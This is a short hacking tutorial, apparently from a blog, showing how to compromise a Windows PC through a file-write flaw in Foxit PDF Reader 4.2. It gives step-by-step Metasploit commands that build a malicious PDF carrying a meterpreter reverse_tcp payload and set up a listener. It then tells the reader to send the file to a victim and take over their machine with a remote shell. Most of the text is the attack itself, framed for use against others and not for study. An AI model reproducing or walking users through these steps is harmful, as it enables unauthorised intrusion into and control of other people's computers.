Hack Remote Windows PC using Foxit PDF Reader 4.2 JavaScript File Write Exploit

This module exploits an unsafe JavaScript API implemented in Foxit PDF Reader version 4.2. The create Data Object () JavaScript API function allows for writing arbitrary files to the file system. This issue was fixed in version 4.3.1.0218. Note: This exploit uses the All Users directory currently, which required administrator privileges to write to. This means an administrative user has to open the file to be successful. Kind of lame but that’s how it goes sometimes in the world of file write bugs.
Foxit Reader 4.2
Windows XP SP 2
Windows 7
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/foxit_reader_filewrite
Msf exploit (foxit_reader_filewrite)>set payload windows/meterpreter/reverse_tcp
Msf exploit (foxit_reader_filewrite)>set lhost 192.168.1.4 (IP of Local Host)
Msf exploit (foxit_reader_filewrite)>set filename scripts.pdf
Msf exploit (foxit_reader_filewrite)>exploit

After we successfully generate the malicious PDF File, it will stored on your local computer
/root/.msf4/local/scripts.pdf

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.4
exploit 
Now send your scripts.pdf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
